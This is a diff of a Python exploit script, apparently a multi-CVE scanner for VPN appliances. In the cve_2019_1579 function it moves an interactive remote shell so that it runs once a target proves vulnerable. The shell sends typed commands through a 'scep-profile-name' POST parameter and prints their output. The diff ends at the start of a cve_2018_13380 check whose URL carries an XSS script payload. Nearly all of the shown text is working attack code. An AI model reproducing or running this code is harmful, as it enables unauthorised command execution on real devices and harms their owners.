@@ -104,47 +104,46 @@ def cve_2019_1579(host, port):
     if not sign in wh and len(wh) < 50:
         print('Pwned shell from %s to %s' % (host, socket.gethostbyname()))
         print('')
+	data = "scep-profile-name=cd"
+        t = requests.post(url, data=data, verify=False).text.replace('\n', '')
+        o = 'unix'
+        if len(t) > 10:
+            o = 'win'
+
+        if o == 'win':
+            data = "scep-profile-name=ver"
+            r = requests.post(url, data=data, verify=False).text.replace('\n', '')
+            crlf = '\n'
+            print(r)
+            print('(c) Microsoft Corporation. All rights reserved.')
+            print('')
+        else:
+            data = "scep-profile-name=hostname"
+            hostname = requests.post(url, data=data, verify=False).text.replace('\n', '')
+            crlf = ''
+            if wh == 'root':
+                priv = '#'
+            else:
+                priv = '$'
+
+        while 1:
+            if o == 'win':
+                data = "scep-profile-name=cd"
+                d = requests.post(url, data=data, verify=False).text.replace('\n', '')
+                i = '%s>' % d
+            else:
+                data = "scep-profile-name=pwd"
+                d = requests.post(url, data=data, verify=False).text.replace('\n', '')
+                if '/home/%s' % wh in d:
+                    pth = d.replace('/home/%s' % wh, '~')
+                i = '%s%s@%s%s:%s%s%s%s ' % (green, wh, hostname, white, blue, pth, white, priv)
+
+            buff = input(i)
+            data = "scep-profile-name=%s" % buff
+            r = requests.post(url, data=data, verify=False).text.replace('\n', '')
+            print(r + crlf)
     else:
         print('The host %s is not vulnerable to CVE-2019-1579' % host)
-
-    data = "scep-profile-name=cd"
-    t = requests.post(url, data=data, verify=False).text.replace('\n', '')
-    o = 'unix'
-    if len(t) > 10:
-        o = 'win'
-
-    if o == 'win':
-        data = "scep-profile-name=ver"
-        r = requests.post(url, data=data, verify=False).text.replace('\n', '')
-        crlf = '\n'
-        print(r)
-        print('(c) Microsoft Corporation. All rights reserved.')
-        print('')
-    else:
-        data = "scep-profile-name=hostname"
-        hostname = requests.post(url, data=data, verify=False).text.replace('\n', '')
-        crlf = ''
-        if wh == 'root':
-            priv = '#'
-        else:
-            priv = '$'
-
-    while 1:
-        if o == 'win':
-            data = "scep-profile-name=cd"
-            d = requests.post(url, data=data, verify=False).text.replace('\n', '')
-            i = '%s>' % d
-        else:
-            data = "scep-profile-name=pwd"
-            d = requests.post(url, data=data, verify=False).text.replace('\n', '')
-            if '/home/%s' % wh in d:
-                pth = d.replace('/home/%s' % wh, '~')
-            i = '%s%s@%s%s:%s%s%s%s ' % (green, wh, hostname, white, blue, pth, white, priv)
-
-        buff = input(i)
-        data = "scep-profile-name=%s" % buff
-        r = requests.post(url, data=data, verify=False).text.replace('\n', '')
-        print(r + crlf)
 
 def cve_2018_13380(host, port):
     url1 = 'https://%s%s/remote/error?errmsg=ABABAB--\%3E\%3Cscript\%3Ealert(1)\%3C/script\%3E' % (host, port)
